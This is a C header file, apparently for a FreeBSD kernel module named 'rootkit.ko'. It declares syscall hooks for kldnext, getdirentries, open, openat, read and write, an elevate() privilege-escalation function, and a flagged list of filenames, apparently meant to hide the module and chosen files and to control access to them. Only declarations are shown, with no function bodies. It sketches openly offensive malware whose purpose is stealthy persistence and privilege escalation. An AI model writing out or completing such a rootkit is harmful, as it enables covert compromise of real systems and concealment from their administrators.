#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/syscallsubr.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/dirent.h>
#include <sys/cdefs.h>
#include <sys/resourcevar.h>
#include <sys/fcntl.h>
#include <sys/errno.h>

#define LINKER_FILE "rootkit.ko"
#define MODULE_NAME "rootkit"


#define R_FLAG_READ		0b00000001
#define R_FLAG_WRITE	0b00000010
#define R_FLAG_EXEC		0b00000100
#define R_FLAG_VIEW		0b00001000

struct node {
	char filename[256];
	struct node * next;
	uint8_t flags;
};

int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
int hook_sys_open(struct thread *, struct open_args *);
int hook_sys_openat(struct thread * td, struct openat_args * uap);
int hook_sys_read(struct thread *, struct read_args *);
int hook_sys_write(struct thread *, struct write_args *);


void elevate(struct thread *td);

int add_file(char * uaddr);
int remove_file(char * uaddr);
int check_file(char * uaddr);
int set_flag_bits(char * uaddr, uint8_t flags);
int unset_flag_bits(char * uaddr, uint8_t flags);
uint8_t get_flags(char * uaddr);
